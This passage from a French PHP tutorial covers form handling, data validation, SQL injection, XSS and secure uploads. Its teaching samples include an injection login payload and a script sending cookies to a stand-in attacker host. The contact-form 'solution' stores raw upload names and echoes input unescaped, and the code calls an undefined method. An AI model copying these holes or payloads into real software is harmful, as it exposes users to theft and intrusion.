    echo "‚úÖ Profil mis √† jour avec succ√®s !";
    echo "&lt;/div&gt;";
    
    // Mettre √† jour les donn√©es pour le pr√©-remplissage
    $utilisateur['nom'] = $_POST['nom'] ?? $utilisateur['nom'];
    $utilisateur['email'] = $_POST['email'] ?? $utilisateur['email'];
    // etc...
}
?&gt;

&lt;h2&gt;‚úèÔ∏è Modifier mon profil&lt;/h2&gt;

&lt;form method="POST"&gt;
    &lt;div&gt;
        &lt;label for="nom"&gt;Nom :&lt;/label&gt;
        &lt;input type="text" id="nom" name="nom" 
               value="&lt;?= htmlspecialchars($utilisateur['nom']) ?&gt;" required&gt;
    &lt;/div&gt;
    
    &lt;div&gt;
        &lt;label for="email"&gt;Email :&lt;/label&gt;
        &lt;input type="email" id="email" name="email" 
               value="&lt;?= htmlspecialchars($utilisateur['email']) ?&gt;" required&gt;
    &lt;/div&gt;
    
    &lt;div&gt;
        &lt;label for="ville"&gt;Ville :&lt;/label&gt;
        &lt;select id="ville" name="ville"&gt;
            &lt;option value="paris" &lt;?= $utilisateur['ville'] === 'paris' ? 'selected' : '' ?&gt;&gt;Paris&lt;/option&gt;
            &lt;option value="lyon" &lt;?= $utilisateur['ville'] === 'lyon' ? 'selected' : '' ?&gt;&gt;Lyon&lt;/option&gt;
            &lt;option value="marseille" &lt;?= $utilisateur['ville'] === 'marseille' ? 'selected' : '' ?&gt;&gt;Marseille&lt;/option&gt;
        &lt;/select&gt;
    &lt;/div&gt;
    
    &lt;div&gt;
        &lt;label&gt;Centres d'int√©r√™t :&lt;/label&gt;
        &lt;input type="checkbox" id="sport" name="interets[]" value="sport"
               &lt;?= in_array('sport', $utilisateur['interets']) ? 'checked' : '' ?&gt;&gt;
        &lt;label for="sport"&gt;Sport&lt;/label&gt;
        
        &lt;input type="checkbox" id="lecture" name="interets[]" value="lecture"
               &lt;?= in_array('lecture', $utilisateur['interets']) ? 'checked' : '' ?&gt;&gt;
        &lt;label for="lecture"&gt;Lecture&lt;/label&gt;
    &lt;/div&gt;
    
    &lt;button type="submit"&gt;üíæ Sauvegarder&lt;/button&gt;
&lt;/form&gt;</code></pre>

    <h3>13.7 Exercice pratique : Syst√®me de contact</h3>
    
    <p><strong>Objectif :</strong> Cr√©er un formulaire de contact complet avec sauvegarde en base de donn√©es.</p>
    
    <p><strong>Cr√©ez :</strong></p>
    <ol>
        <li>Un formulaire HTML avec : nom, email, sujet, message, fichier joint (optionnel)</li>
        <li>Une page de traitement PHP qui :
            <ul>
                <li>V√©rifie que tous les champs obligatoires sont remplis</li>
                <li>Sauvegarde le message en base de donn√©es</li>
                <li>G√®re l'upload du fichier joint</li>
                <li>Affiche un message de confirmation</li>
            </ul>
        </li>
        <li>Une page d'administration pour voir tous les messages re√ßus</li>
    </ol>

    <details>
        <summary><strong>üí° Voir la solution</strong></summary>
        <pre><code>&lt;!-- contact.html --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Contact&lt;/title&gt;
    &lt;style&gt;
        form { max-width: 500px; margin: 20px auto; }
        div { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input, select, textarea { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; }
        button { background: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;üìß Nous contacter&lt;/h1&gt;
    
    &lt;form method="POST" action="traiter_contact.php" enctype="multipart/form-data"&gt;
        &lt;div&gt;
            &lt;label for="nom"&gt;Nom complet * :&lt;/label&gt;
            &lt;input type="text" id="nom" name="nom" required&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label for="email"&gt;Email * :&lt;/label&gt;
            &lt;input type="email" id="email" name="email" required&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label for="sujet"&gt;Sujet * :&lt;/label&gt;
            &lt;select id="sujet" name="sujet" required&gt;
                &lt;option value=""&gt;Choisissez un sujet...&lt;/option&gt;
                &lt;option value="info"&gt;Demande d'information&lt;/option&gt;
                &lt;option value="support"&gt;Support technique&lt;/option&gt;
                &lt;option value="bug"&gt;Signaler un bug&lt;/option&gt;
                &lt;option value="autre"&gt;Autre&lt;/option&gt;
            &lt;/select&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label for="message"&gt;Message * :&lt;/label&gt;
            &lt;textarea id="message" name="message" rows="6" required&gt;&lt;/textarea&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label for="fichier"&gt;Fichier joint (optionnel) :&lt;/label&gt;
            &lt;input type="file" id="fichier" name="fichier"&gt;
        &lt;/div&gt;
        
        &lt;button type="submit"&gt;üì§ Envoyer le message&lt;/button&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;

&lt;?php
// traiter_contact.php
require_once 'config.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $nom = trim($_POST['nom'] ?? '');
    $email = trim($_POST['email'] ?? '');
    $sujet = $_POST['sujet'] ?? '';
    $message = trim($_POST['message'] ?? '');
    
    $erreurs = [];
    
    // Validation
    if (empty($nom)) $erreurs[] = "Le nom est obligatoire";
    if (empty($email)) $erreurs[] = "L'email est obligatoire";
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) $erreurs[] = "Email invalide";
    if (empty($sujet)) $erreurs[] = "Le sujet est obligatoire";
    if (empty($message)) $erreurs[] = "Le message est obligatoire";
    
    if (empty($erreurs)) {
        try {
            $pdo = connecterDB();
            
            // Traitement du fichier joint
            $nomFichier = null;
            if (isset($_FILES['fichier']) && $_FILES['fichier']['error'] === UPLOAD_ERR_OK) {
                $dossier = 'uploads/contact/';
                if (!is_dir($dossier)) mkdir($dossier, 0777, true);
                
                $nomFichier = uniqid() . '_' . $_FILES['fichier']['name'];
                move_uploaded_file($_FILES['fichier']['tmp_name'], $dossier . $nomFichier);
            }
            
            // Insertion en base
            $sql = "INSERT INTO messages_contact (nom, email, sujet, message, fichier_joint, date_envoi) 
                    VALUES (:nom, :email, :sujet, :message, :fichier, NOW())";
            
            $stmt = $pdo->prepare($sql);
            $stmt->execute([
                ':nom' => $nom,
                ':email' => $email,
                ':sujet' => $sujet,
                ':message' => $message,
                ':fichier' => $nomFichier
            ]);
            
            echo "&lt;div style='background: #d4edda; padding: 20px; border-radius: 5px; margin: 20px;'&gt;";
            echo "&lt;h2&gt;‚úÖ Message envoy√© avec succ√®s !&lt;/h2&gt;";
            echo "&lt;p&gt;Merci $nom, nous vous r√©pondrons √† l'adresse $email dans les plus brefs d√©lais.&lt;/p&gt;";
            echo "&lt;/div&gt;";
            
        } catch (Exception $e) {
            echo "&lt;div style='background: #f8d7da; padding: 20px; border-radius: 5px; margin: 20px;'&gt;";
            echo "&lt;h2&gt;‚ùå Erreur&lt;/h2&gt;";
            echo "&lt;p&gt;Une erreur est survenue. Veuillez r√©essayer.&lt;/p&gt;";
            echo "&lt;/div&gt;";
        }
    } else {
        echo "&lt;div style='background: #fff3cd; padding: 20px; border-radius: 5px; margin: 20px;'&gt;";
        echo "&lt;h2&gt;‚ö†Ô∏è Erreurs d√©tect√©es :&lt;/h2&gt;";
        foreach ($erreurs as $erreur) {
            echo "&lt;p&gt;‚Ä¢ $erreur&lt;/p&gt;";
        }
        echo "&lt;/div&gt;";
    }
}
?&gt;</code></pre>
    </details>
</section>

<!-- Partie 14: Validation et s√©curisation des donn√©es -->
<section class="part14">
    <h2>14. Validation et s√©curisation des donn√©es</h2>
    
    <p>La s√©curit√© en PHP, c'est comme fermer sa maison √† cl√© ! Vous ne laisseriez jamais votre porte d'entr√©e ouverte, alors ne laissez pas votre site web vuln√©rable aux attaques. <strong>Jamais faire confiance aux donn√©es venant des utilisateurs</strong> est la r√®gle d'or de la s√©curit√© web.</p>

    <p>Nous allons apprendre √† nous prot√©ger contre les principales menaces :</p>
    <ul>
        <li>üóÉÔ∏è <strong>Injection SQL</strong> : Quand un pirate tente de pirater votre base de donn√©es</li>
        <li>üîì <strong>Attaques XSS</strong> : Injection de code malveillant dans vos pages</li>
        <li>üìù <strong>Donn√©es invalides</strong> : V√©rifier que tout est correct avant traitement</li>
    </ul>

    <h3>14.1 Filtrage et validation des donn√©es</h3>
    
    <p>Avant d'utiliser les donn√©es des utilisateurs, il faut les <strong>nettoyer</strong> et <strong>v√©rifier</strong> qu'elles sont valides.</p>

    <h4>Fonction de nettoyage de base :</h4>
    <pre><code>&lt;?php
function nettoyerDonnee($donnee) {
    // Supprimer les espaces en d√©but/fin
    $donnee = trim($donnee);
    
    // Supprimer les antislashs
    $donnee = stripslashes($donnee);
    
    // Convertir les caract√®res sp√©ciaux HTML
    $donnee = htmlspecialchars($donnee);
    
    return $donnee;
}

// Utilisation
$nom = nettoyerDonnee($_POST['nom'] ?? '');
$email = nettoyerDonnee($_POST['email'] ?? '');
?&gt;</code></pre>

    <h4>Validation avanc√©e avec les filtres PHP :</h4>
    <pre><code>&lt;?php
function validerDonnees($donnees) {
    $erreurs = [];
    $donneesClean = [];
    
    // Validation du nom
    if (empty($donnees['nom'])) {
        $erreurs['nom'] = "Le nom est obligatoire";
    } else {
        $nom = filter_var(trim($donnees['nom']), FILTER_SANITIZE_STRING);
        if (strlen($nom) &lt; 2) {
            $erreurs['nom'] = "Le nom doit faire au moins 2 caract√®res";
        } elseif (strlen($nom) &gt; 50) {
            $erreurs['nom'] = "Le nom ne peut pas d√©passer 50 caract√®res";
        } else {
            $donneesClean['nom'] = $nom;
        }
    }
    
    // Validation de l'email
    if (empty($donnees['email'])) {
        $erreurs['email'] = "L'email est obligatoire";
    } else {
        $email = filter_var(trim($donnees['email']), FILTER_VALIDATE_EMAIL);
        if ($email === false) {
            $erreurs['email'] = "Format d'email invalide";
        } else {
            $donneesClean['email'] = $email;
        }
    }
    
    // Validation de l'√¢ge
    if (!empty($donnees['age'])) {
        $age = filter_var($donnees['age'], FILTER_VALIDATE_INT, [
            'options' => [
                'min_range' => 13,
                'max_range' => 120
            ]
        ]);
        
        if ($age === false) {
            $erreurs['age'] = "L'√¢ge doit √™tre entre 13 et 120 ans";
        } else {
            $donneesClean['age'] = $age;
        }
    }
    
    // Validation du t√©l√©phone
    if (!empty($donnees['telephone'])) {
        $tel = preg_replace('/[^0-9+\-\s\.]/', '', $donnees['telephone']);
        if (strlen($tel) &lt; 10) {
            $erreurs['telephone'] = "Num√©ro de t√©l√©phone invalide";
        } else {
            $donneesClean['telephone'] = $tel;
        }
    }
    
    return [
        'erreurs' => $erreurs,
        'donnees' => $donneesClean,
        'valide' => empty($erreurs)
    ];
}

// Utilisation
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $validation = validerDonnees($_POST);
    
    if ($validation['valide']) {
        echo "‚úÖ Toutes les donn√©es sont valides !";
        // Proc√©der √† l'insertion en base
    } else {
        echo "&lt;div style='background: #f8d7da; padding: 15px; border-radius: 5px;'&gt;";
        echo "&lt;h4&gt;‚ùå Erreurs d√©tect√©es :&lt;/h4&gt;";
        foreach ($validation['erreurs'] as $champ =&gt; $erreur) {
            echo "&lt;p&gt;&lt;strong&gt;$champ :&lt;/strong&gt; $erreur&lt;/p&gt;";
        }
        echo "&lt;/div&gt;";
    }
}
?&gt;</code></pre>

    <h3>14.2 Protection contre les injections SQL</h3>
    
    <p>L'injection SQL est l'une des attaques les plus dangereuses. Un pirate peut litt√©ralement "parler" directement √† votre base de donn√©es !</p>

    <h4>‚ùå Code vuln√©rable (JAMAIS faire √ßa !) :</h4>
    <pre><code>&lt;?php
// DANGER ! Code vuln√©rable aux injections SQL
$email = $_POST['email'];
$password = $_POST['password'];

$sql = "SELECT * FROM utilisateurs WHERE email = '$email' AND password = '$password'";
$result = $pdo-&gt;query($sql);

// Un pirate pourrait envoyer :
// email: admin@site.com' OR '1'='1' --
// password: n'importe quoi
// La requ√™te devient : SELECT * FROM utilisateurs WHERE email = 'admin@site.com' OR '1'='1' --' AND password = '...'
// Le -- met le reste en commentaire, et 1=1 est toujours vrai !
?&gt;</code></pre>

    <h4>‚úÖ Code s√©curis√© avec requ√™tes pr√©par√©es :</h4>
    <pre><code>&lt;?php
function connexionSecurisee($pdo, $email, $password) {
    // Validation des entr√©es
    $email = filter_var(trim($email), FILTER_VALIDATE_EMAIL);
    if (!$email) {
        return ['succes' => false, 'message' => 'Email invalide'];
    }
    
    // Requ√™te pr√©par√©e - S√âCURIS√âE
    $sql = "SELECT id, nom, prenom, email, password_hash 
            FROM utilisateurs 
            WHERE email = :email AND actif = 1";
    
    try {
        $stmt = $pdo-&gt;prepare($sql);
        $stmt-&gt;execute([':email' =&gt; $email]);
        $utilisateur = $stmt-&gt;fetch();
        
        if ($utilisateur && password_verify($password, $utilisateur['password_hash'])) {
            // Connexion r√©ussie
            session_start();
            $_SESSION['user_id'] = $utilisateur['id'];
            $_SESSION['user_nom'] = $utilisateur['nom'];
            
            return [
                'succes' => true, 
                'message' => 'Connexion r√©ussie',
                'utilisateur' => $utilisateur
            ];
        } else {
            return ['succes' => false, 'message' => 'Email ou mot de passe incorrect'];
        }
        
    } catch (PDOException $e) {
        error_log("Erreur connexion : " . $e-&gt;getMessage());
        return ['succes' => false, 'message' => 'Erreur syst√®me'];
    }
}

// Utilisation
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $resultat = connexionSecurisee($pdo, $_POST['email'], $_POST['password']);
    
    if ($resultat['succes']) {
        header('Location: dashboard.php');
        exit;
    } else {
        $messageErreur = $resultat['message'];
    }
}
?&gt;</code></pre>

    <h3>14.3 Protection contre les attaques XSS</h3>
    
    <p>Les attaques XSS (Cross-Site Scripting) consistent √† injecter du code JavaScript malveillant dans votre site.</p>

    <h4>Sc√©nario d'attaque XSS :</h4>
    <pre><code>&lt;!-- Un pirate pourrait soumettre ce commentaire : --&gt;
&lt;script&gt;
    // Code malveillant qui vole les cookies et les envoie au pirate
    document.location = 'http://site-pirate.com/voler.php?cookies=' + document.cookie;
&lt;/script&gt;</code></pre>

    <h4>Protection avec htmlspecialchars() :</h4>
    <pre><code>&lt;?php
function afficherCommentaireSecurise($commentaire) {
    // Convertit &lt;script&gt; en &amp;lt;script&amp;gt; - inoffensif !
    return htmlspecialchars($commentaire, ENT_QUOTES, 'UTF-8');
}

function afficherCommentairesAvancee($commentaire) {
    // Nettoyage plus avanc√©
    $commentaire = trim($commentaire);
    
    // Supprimer les balises dangereuses
    $commentaire = strip_tags($commentaire, '&lt;b&gt;&lt;i&gt;&lt;u&gt;&lt;br&gt;&lt;p&gt;');
    
    // √âchapper pour l'affichage HTML
    $commentaire = htmlspecialchars($commentaire, ENT_QUOTES, 'UTF-8');
    
    // Convertir les retours √† la ligne
    $commentaire = nl2br($commentaire);
    
    return $commentaire;
}

// Exemple d'utilisation dans un syst√®me de commentaires
function ajouterCommentaire($pdo, $nom, $email, $commentaire) {
    // Validation
    $erreurs = [];
    
    if (empty($nom) || strlen($nom) &lt; 2) {
        $erreurs[] = "Nom invalide";
    }
    
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $erreurs[] = "Email invalide";
    }
    
    if (empty($commentaire) || strlen($commentaire) &lt; 10) {
        $erreurs[] = "Commentaire trop court (minimum 10 caract√®res)";
    }
    
    // V√©rifier les mots interdits
    $motsInterdits = ['spam', 'viagra', 'casino'];
    foreach ($motsInterdits as $mot) {
        if (stripos($commentaire, $mot) !== false) {
            $erreurs[] = "Contenu non autoris√© d√©tect√©";
            break;
        }
    }
    
    if (empty($erreurs)) {
        $sql = "INSERT INTO commentaires (nom, email, commentaire, date_creation, modere) 
                VALUES (:nom, :email, :commentaire, NOW(), 0)";
        
        try {
            $stmt = $pdo-&gt;prepare($sql);
            $stmt-&gt;execute([
                ':nom' =&gt; htmlspecialchars($nom),
                ':email' =&gt; $email,
                ':commentaire' =&gt; htmlspecialchars($commentaire)
            ]);
            
            return ['succes' =&gt; true, 'message' =&gt; 'Commentaire ajout√© (en attente de mod√©ration)'];
            
        } catch (PDOException $e) {
            return ['succes' =&gt; false, 'message' =&gt; 'Erreur lors de l\'ajout'];
        }
    }
    
    return ['succes' =&gt; false, 'erreurs' =&gt; $erreurs];
}
?&gt;</code></pre>

    <h3>14.4 Validation sp√©cialis√©e par type de donn√©es</h3>
    
    <h4>Classe de validation compl√®te :</h4>
    <pre><code>&lt;?php
class Validateur {
    private $erreurs = [];
    
    public function validerNom($nom, $obligatoire = true) {
        if ($obligatoire && empty($nom)) {
            $this-&gt;erreurs['nom'] = "Le nom est obligatoire";
            return false;
        }
        
        if (!empty($nom)) {
            $nom = trim($nom);
            if (strlen($nom) &lt; 2) {
                $this-&gt;erreurs['nom'] = "Le nom doit faire au moins 2 caract√®res";
                return false;
            }
            
            if (!preg_match("/^[a-zA-Z√Ä-√ø\s\-']+$/u", $nom)) {
                $this-&gt;erreurs['nom'] = "Le nom contient des caract√®res invalides";
                return false;
            }
        }
        
        return true;
    }
    
    public function validerEmail($email, $obligatoire = true) {
        if ($obligatoire && empty($email)) {
            $this-&gt;erreurs['email'] = "L'email est obligatoire";
            return false;
        }
        
        if (!empty($email)) {
            $email = filter_var(trim($email), FILTER_VALIDATE_EMAIL);
            if (!$email) {
                $this-&gt;erreurs['email'] = "Format d'email invalide";
                return false;
            }
        }
        
        return true;
    }
    
    public function validerMotDePasse($password) {
        if (empty($password)) {
            $this-&gt;erreurs['password'] = "Le mot de passe est obligatoire";
            return false;
        }
        
        if (strlen($password) &lt; 8) {
            $this-&gt;erreurs['password'] = "Le mot de passe doit faire au moins 8 caract√®res";
            return false;
        }
        
        if (!preg_match("/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/", $password)) {
            $this-&gt;erreurs['password'] = "Le mot de passe doit contenir au moins une minuscule, une majuscule et un chiffre";
            return false;
        }
        
        return true;
    }
    
    public function validerTelephone($telephone, $obligatoire = false) {
        if ($obligatoire && empty($telephone)) {
            $this-&gt;erreurs['telephone'] = "Le t√©l√©phone est obligatoire";
            return false;
        }
        
        if (!empty($telephone)) {
            // Accepter diff√©rents formats fran√ßais
            $patterns = [
                '/^0[1-9](\d{8})$/',           // 0123456789
                '/^0[1-9]([-\s]?\d{2}){4}$/',  // 01 23 45 67 89
                '/^\+33[1-9](\d{8})$/'         // +33123456789
            ];
            
            $telephone = preg_replace('/[\s\-\.]/', '', $telephone);
            $valide = false;
            
            foreach ($patterns as $pattern) {
                if (preg_match($pattern, $telephone)) {
                    $valide = true;
                    break;
                }
            }
            
            if (!$valide) {
                $this-&gt;erreurs['telephone'] = "Format de t√©l√©phone invalide";
                return false;
            }
        }
        
        return true;
    }
    
    public function validerURL($url, $obligatoire = false) {
        if ($obligatoire && empty($url)) {
            $this-&gt;erreurs['url'] = "L'URL est obligatoire";
            return false;
        }
        
        if (!empty($url)) {
            if (!filter_var($url, FILTER_VALIDATE_URL)) {
                $this-&gt;erreurs['url'] = "Format d'URL invalide";
                return false;
            }
        }
        
        return true;
    }
    
    public function obtenirErreurs() {
        return $this-&gt;erreurs;
    }
    
    public function estValide() {
        return empty($this-&gt;erreurs);
    }
    
    public function reinitialiser() {
        $this-&gt;erreurs = [];
    }
}

// Utilisation
$validateur = new Validateur();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $validateur-&gt;validerNom($_POST['nom']);
    $validateur-&gt;validerEmail($_POST['email']);
    $validateur-&gt;validerMotDePasse($_POST['password']);
    $validateur-&gt;validerTelephone($_POST['telephone']);
    
    if ($validateur-&gt;estValide()) {
        echo "‚úÖ Toutes les donn√©es sont valides !";
        // Proc√©der √† l'insertion
    } else {
        echo "&lt;div style='background: #f8d7da; padding: 15px; border-radius: 5px;'&gt;";
        echo "&lt;h4&gt;‚ùå Erreurs de validation :&lt;/h4&gt;";
        foreach ($validateur-&gt;obtenirErreurs() as $champ =&gt; $erreur) {
            echo "&lt;p&gt;&lt;strong&gt;$champ :&lt;/strong&gt; $erreur&lt;/p&gt;";
        }
        echo "&lt;/div&gt;";
    }
}
?&gt;</code></pre>

    <h3>14.5 S√©curisation des uploads de fichiers</h3>
    
    <p>L'upload de fichiers est particuli√®rement dangereux si mal s√©curis√© !</p>

    <pre><code>&lt;?php
class SecuriteUpload {
    private $typesAutorises = [
        'image/jpeg',
        'image/png', 
        'image/gif',
        'application/pdf',
        'text/plain'
    ];
    
    private $extensionsAutorisees = ['jpg', 'jpeg', 'png', 'gif', 'pdf', 'txt'];
    private $tailleMax = 5242880; // 5 MB
    
    public function validerFichier($fichier) {
        $erreurs = [];
        
        // V√©rifier qu'il n'y a pas d'erreur d'upload
        if ($fichier['error'] !== UPLOAD_ERR_OK) {
            $erreurs[] = "Erreur lors de l'upload du fichier";
            return $erreurs;
        }
        
        // V√©rifier la taille
        if ($fichier['size'] &gt; $this-&gt;tailleMax) {
            $erreurs[] = "Le fichier est trop volumineux (max " . 
                        number_format($this-&gt;tailleMax / 1024 / 1024, 1) . " MB)";
        }
        
        // V√©rifier le type MIME
        if (!in_array($fichier['type'], $this-&gt;typesAutorises)) {
            $erreurs[] = "Type de fichier non autoris√©";
        }
        
        // V√©rifier l'extension
        $extension = strtolower(pathinfo($fichier['name'], PATHINFO_EXTENSION));
        if (!in_array($extension, $this-&gt;extensionsAutorisees)) {
            $erreurs[] = "Extension de fichier non autoris√©e";
        }
        
        // V√©rifier que c'est vraiment une image si c'est d√©clar√© comme tel
        if (strpos($fichier['type'], 'image/') === 0) {
            $infoImage = getimagesize($fichier['tmp_name']);
            if ($infoImage === false) {
                $erreurs[] = "Le fichier n'est pas une image valide";
            }
        }
        
        return $erreurs;
    }
    
    public function sauvegarderFichier($fichier, $dossierDestination) {
        $erreurs = $this-&gt;validerFichier($fichier);
        
        if (!empty($erreurs)) {
            return ['succes' =&gt; false, 'erreurs' =&gt; $erreurs];
        }
        
        // Cr√©er le dossier si n√©cessaire
        if (!is_dir($dossierDestination)) {
            mkdir($dossierDestination, 0755, true);
        }
        
        // G√©n√©rer un nom s√©curis√©
        $extension = strtolower(pathinfo($fichier['name'], PATHINFO_EXTENSION));
        $nomSecurise = uniqid() . '_' . time() . '.' . $extension;
        $cheminComplet = $dossierDestination . '/' . $nomSecurise;
        
        // D√©placer le fichier
        if (move_uploaded_file($fichier['tmp_name'], $cheminComplet)) {
            return [
                'succes' =&gt; true,
                'nom_fichier' =&gt; $nomSecurise,
                'chemin_complet' =&gt; $cheminComplet,
                'taille' =&gt; $fichier['size']
            ];
        } else {
            return ['succes' =&gt; false, 'erreurs' =&gt; ['Erreur lors de la sauvegarde']];
        }
    }
}

// Utilisation
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['photo'])) {
    $secureUpload = new SecuriteUpload();
    $resultat = $secureUpload-&gt;sauvegarderFichier($_FILES['photo'], 'uploads/photos');
    
    if ($resultat['succes']) {
        echo "‚úÖ Fichier upload√© : " . $resultat['nom_fichier'];
    } else {
        echo "‚ùå Erreurs : " . implode(', ', $resultat['erreurs']);
    }
}
?&gt;</code></pre>

    <h3>14.6 Exercice pratique : Syst√®me d'inscription s√©curis√©</h3>
    
    <p><strong>Objectif :</strong> Cr√©er un syst√®me d'inscription compl√®tement s√©curis√©.</p>
    
    <p><strong>Cr√©ez :</strong></p>
    <ol>
        <li>Un formulaire d'inscription avec validation c√¥t√© client (HTML5)</li>
        <li>Une validation c√¥t√© serveur compl√®te</li>
        <li>Hachage s√©curis√© des mots de passe</li>
        <li>Protection contre les doublons d'email</li>
        <li>Upload d'avatar s√©curis√©</li>
        <li>Messages d'erreur clairs et s√©curis√©s</li>
    </ol>

    <details>
        <summary><strong>üí° Voir la solution</strong></summary>
        <pre><code>&lt;!-- inscription_securisee.html --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Inscription s√©curis√©e&lt;/title&gt;
    &lt;style&gt;
        .form-container { max-width: 600px; margin: 20px auto; padding: 20px; border: 1px solid #ddd; border-radius: 8px; }
        .field { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input, select { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; }
        .error { color: red; font-size: 0.9em; }
        .success { color: green; background: #d4edda; padding: 10px; border-radius: 4px; }
        button { background: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class="form-container"&gt;
        &lt;h2&gt;üîê Inscription s√©curis√©e&lt;/h2&gt;
        
        &lt;form method="POST" action="traiter_inscription_securisee.php" enctype="multipart/form-data"&gt;
            &lt;div class="field"&gt;
                &lt;label for="nom"&gt;Nom complet * :&lt;/label&gt;
                &lt;input type="text" id="nom" name="nom" required minlength="2" maxlength="50"&gt;
            &lt;/div&gt;
            
            &lt;div class="field"&gt;
                &lt;label for="email"&gt;Email * :&lt;/label&gt;
                &lt;input type="email" id="email" name="email" required&gt;
            &lt;/div&gt;
            
            &lt;div class="field"&gt;
                &lt;label for="password"&gt;Mot de passe * :&lt;/label&gt;
                &lt;input type="password" id="password" name="password" required minlength="8"&gt;
                &lt;small&gt;Au moins 8 caract√®res avec majuscule, minuscule et chiffre&lt;/small&gt;
            &lt;/div&gt;
            
            &lt;div class="field"&gt;
                &lt;label for="confirm_password"&gt;Confirmer le mot de passe * :&lt;/label&gt;
                &lt;input type="password" id="confirm_password" name="confirm_password" required&gt;
            &lt;/div&gt;
            
            &lt;div class="field"&gt;
                &lt;label for="telephone"&gt;T√©l√©phone :&lt;/label&gt;
                &lt;input type="tel" id="telephone" name="telephone" placeholder="06 12 34 56 78"&gt;
            &lt;/div&gt;
            
            &lt;div class="field"&gt;
                &lt;label for="avatar"&gt;Avatar (optionnel) :&lt;/label&gt;
                &lt;input type="file" id="avatar" name="avatar" accept="image/*"&gt;
            &lt;/div&gt;
            
            &lt;button type="submit"&gt;üöÄ S'inscrire&lt;/button&gt;
        &lt;/form&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;

&lt;?php
// traiter_inscription_securisee.php
require_once 'config.php';
require_once 'Validateur.php';
require_once 'SecuriteUpload.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $validateur = new Validateur();
    $upload = new SecuriteUpload();
    
    // R√©cup√©ration des donn√©es
    $nom = trim($_POST['nom'] ?? '');
    $email = trim($_POST['email'] ?? '');
    $password = $_POST['password'] ?? '';
    $confirmPassword = $_POST['confirm_password'] ?? '';
    $telephone = trim($_POST['telephone'] ?? '');
    
    // Validation
    $validateur-&gt;validerNom($nom);
    $validateur-&gt;validerEmail($email);
    $validateur-&gt;validerMotDePasse($password);
    $validateur-&gt;validerTelephone($telephone, false);
    
    // V√©rifier que les mots de passe correspondent
    if ($password !== $confirmPassword) {
        $validateur-&gt;ajouterErreur('confirm_password', 'Les mots de passe ne correspondent pas');
    }
    
    $pdo = connecterDB();
    
    // V√©rifier que l'email n'existe pas d√©j√†
    $sql = "SELECT id FROM utilisateurs WHERE email = :email";
    $stmt = $pdo-&gt;prepare($sql);
    $stmt-&gt;execute([':email' =&gt; $email]);
    if ($stmt-&gt;fetch()) {
        $validateur-&gt;ajouterErreur('email', 'Cet email est d√©j√† utilis√©');
    }
    
    // Traitement de l'avatar
    $avatar = null;
    if (isset($_FILES['avatar']) && $_FILES['avatar']['error'] === UPLOAD_ERR_OK) {
        $resultatUpload = $upload-&gt;sauvegarderFichier($_FILES['avatar'], 'uploads/avatars');
        if ($resultatUpload['succes']) {
            $avatar = $resultatUpload['nom_fichier'];
        } else {
            foreach ($resultatUpload['erreurs'] as $erreur) {
                $validateur-&gt;ajouterErreur('avatar', $erreur);
            }
        }
    }
    
    // Si tout est valide, proc√©der √† l'inscription
    if ($validateur-&gt;estValide()) {
        try {
            $passwordHash = password_hash($password, PASSWORD_DEFAULT);
            
            $sql = "INSERT INTO utilisateurs (nom, email, password_hash, telephone, avatar, date_inscription) 
                    VALUES (:nom, :email, :password, :telephone, :avatar, NOW())";
            
            $stmt = $pdo-&gt;prepare($sql);
            $stmt-&gt;execute([
                ':nom' =&gt; $nom,
                ':email' =&gt; $email,
                ':password' =&gt; $passwordHash,
                ':telephone' =&gt; $telephone,
                ':avatar' =&gt; $avatar
            ]);
            
            echo "&lt;div class='success'&gt;";
            echo "&lt;h2&gt;‚úÖ Inscription r√©ussie !&lt;/h2&gt;";
            echo "&lt;p&gt;Bienvenue $nom ! Votre compte a √©t√© cr√©√© avec succ√®s.&lt;/p&gt;";
            if ($avatar) {
                echo "&lt;p&gt;Avatar upload√© : &lt;img src='uploads/avatars/$avatar' style='width: 50px; height: 50px; border-radius: 50%;'&gt;&lt;/p&gt;";
            }
            echo "&lt;p&gt;&lt;a href='connexion.php'&gt;Se connecter&lt;/a&gt;&lt;/p&gt;";
            echo "&lt;/div&gt;";
            
        } catch (PDOException $e) {
            echo "&lt;div class='error'&gt;‚ùå Erreur lors de l'inscription. Veuillez r√©essayer.&lt;/div&gt;";
            error_log("Erreur inscription : " . $e-&gt;getMessage());
        }
    } else {
        echo "&lt;div style='background: #f8d7da; padding: 15px; border-radius: 5px; margin: 20px;'&gt;";
        echo "&lt;h3&gt;‚ùå Erreurs d√©tect√©es :&lt;/h3&gt;";
        foreach ($validateur-&gt;obtenirErreurs() as $champ =&gt; $erreur) {
            echo "&lt;p&gt;&lt;strong&gt;" . ucfirst($champ) . " :&lt;/strong&gt; $erreur&lt;/p&gt;";
        }
        echo "&lt;/div&gt;";
    }
}
?&gt;</code></pre>
    </details>
</section>

<!-- Partie 15: Sessions et cookies -->
<section class="part15">
    <h2>15. Sessions et cookies</h2>
    
